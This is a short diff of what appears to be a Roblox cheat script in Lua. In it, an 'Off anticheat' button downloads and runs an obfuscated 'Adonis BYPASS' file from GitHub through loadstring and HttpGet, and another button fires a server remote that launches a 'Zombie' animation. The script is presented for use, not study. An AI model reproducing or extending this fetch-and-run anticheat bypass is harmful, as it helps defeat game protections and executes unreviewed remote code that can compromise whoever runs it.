@@ -33,7 +33,6 @@ local ACButton = Tab:CreateButton({
    Info = "Off anticheat.", -- Speaks for itself, Remove if none.
    Interact = 'Click',
    Callback = function()
-   print('Pressed')
 wait(0.5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RelkzzRebranded/Bypassed---OBFUSCATED..../main/Adonis%20BYPASS.lua"))()
    end,
@@ -48,7 +47,13 @@ wait(0.5)
    local args = {
     [1] = "Zombie"
 }
+wait(0.5)
 game:GetService("ReplicatedStorage").Remotes.Zombie.StartZombieAnim:FireServer(unpack(args))
+game:GetService'StarterGui':SetCore('SendNotification', {
+  Title = 'Notification',
+  Text = 'Mutation launched!',
+  Duration = 5
+})
    end,
 })
 
